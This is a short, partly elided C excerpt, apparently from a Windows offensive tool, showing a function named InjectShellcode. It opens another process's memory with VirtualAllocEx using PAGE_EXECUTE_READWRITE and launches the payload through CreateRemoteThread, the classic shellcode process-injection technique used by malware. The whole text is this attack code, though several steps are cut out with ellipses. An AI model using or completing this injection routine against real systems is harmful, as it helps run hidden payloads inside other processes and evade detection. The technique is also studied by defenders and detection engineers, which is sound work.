...
BOOL InjectShellcode( DWORD Pid, PVOID Payload, DWORD PayloadSize ) {
    ...
    Memory = VirtualAllocEx(
        ProcessHandle, NULL, PayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE );
    if (!Memory) {
    ...
    // start the thread
    ThreadHandle =
        CreateRemoteThread( ProcessHandle, NULL, 0, (LPTHREAD_START_ROUTINE)Memory, NULL, 0, NULL );
